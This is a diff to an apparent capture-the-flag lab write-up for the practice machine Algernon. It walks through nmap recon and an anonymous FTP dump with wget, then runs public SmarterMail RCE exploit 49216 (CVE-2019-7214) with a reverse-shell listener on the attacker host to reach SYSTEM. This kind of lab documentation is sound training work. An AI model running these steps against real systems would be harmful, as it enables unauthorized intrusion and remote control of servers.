@@ -2,26 +2,19 @@
 
 - Author: Henry Post
 - Target: Algernon
-- Target IP: 1.2.3.4
-- Date: 04/17/2026
-
+- Target IP: 192.168.53.65
+- Date: 04/20/2026
 ## Executive Summary
 
-%% This machine, `hackme`, was enumerated by `nmap` to have ports 22 and 8000 open.
+This machine, Algernon, was enumerated by `nmap` to be running FTP, and SmarterMail.
 
-Port 8000 was running a `ladon` web service, which had default credentials of `admin:admin`.
+The SmarterMail software was vulnerable to `CVE-2019-7214`, a remote code execution vulnerability.
 
-To get non-root access, I used `CVE-2025-1234` on `exploit-db.com`.
-
-From there, I identified a binary with elevated capabilities and used it to pivot to root. %%
+This CVE was used to get SYSTEM level access.
 
 ### Recommendations
-
-%% 1. Update Ladon to the latest non-vulnerable version.
-1. Do not use default credentials of `admin:admin`.
-  2. Use strong credentials.
-3. Do not use `setuid` binary permissions on Python or other binaries. Instead, remove the `setuid` permission from binaries that do not need it. %%
-
+1. Update `SmarterMail` to the latest non-vulnerable version.
+2. Do not use FTP anonymous login. Require a strong password.
 ## Recon
 
 We scan with `nmap -sS -sV algernon`.
@@ -53,6 +46,7 @@ We notice port 21, 80, ms-services, and 9998 are open.
 We visit http://algernon:9998/interface/root#/login .
 
 It's running SmarterMail v17.
+## Root access
 
 https://medium.com/@Dpsypher/pg-practice-algernon-5382b92a8142
 
@@ -61,7 +55,7 @@ We're going to cheat a bit. It's late and I'm tired.
 Let's try FTP. `wget -r` dumps all files.
 
 ```bash
-wget -r ftp://Anonymous:pass@algernon
+wget -r ftp://Anonymous:potato123@algernon
 ```
 
 Some interesting files. They use ClamAV.
@@ -78,26 +72,56 @@ Some interesting files. They use ClamAV.
 03:36:08.242 [192.168.118.6] User admin@ logging out
 ```
 
-## Root access
+From the guide,
+> Deploy the SmarterMail RCE exploit with a reverse shell payload.
+
+Okay. Let's try one.
+
+```sh
+searchsploit smartermail
+# SmarterMail Build 6985 - Remote Code Execution                          | windows/remote/49216.py
+
+searchsploit --path 49216
+# /usr/share/exploitdb/exploits/windows/remote/49216.py
+
+cp /usr/share/exploitdb/exploits/windows/remote/49216.py ./
+
+ip a |grep 192 #attacker=192.168.49.56
+
+# edit file....
+<<EOF
+HOST='algernon'
+PORT=17001
+LHOST='192.168.49.56'
+LPORT=4444
+EOF
+
+# It works!
+```
+
+We now have non-root access by using exploit `49216`.
+
+We notice the user `dean` exists.
+
+```
+PS C:\users> dir
+
+    Directory: C:\users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        4/29/2020  10:30 PM                .NET v4.5
+d-----        4/29/2020  10:30 PM                .NET v4.5 Classic
+d-----         5/2/2022   7:05 AM                Administrator
+d-----        4/23/2020   3:16 AM                dean
+d-r---        4/22/2020   4:54 AM                Public
+```
 
 
+![](Pasted%20image%2020260420104529.png)
 
-## Proof
+We get the reverse shell callback.
 
-### Local proof
+![](Pasted%20image%2020260420104616.png)
 
-- `ip a`/`ifconfig`
-- `whoami`
-- `hostname`
-- `date`
-- `cat local.txt`
-(IMG_PLACEHOLDER)
-
-### Root proof
-
-- `ip a`/`ifconfig`
-- `whoami`
-- `hostname`
-- `date`
-- `cat proof.txt`
-(IMG_PLACEHOLDER)
+We have SYSTEM level access.
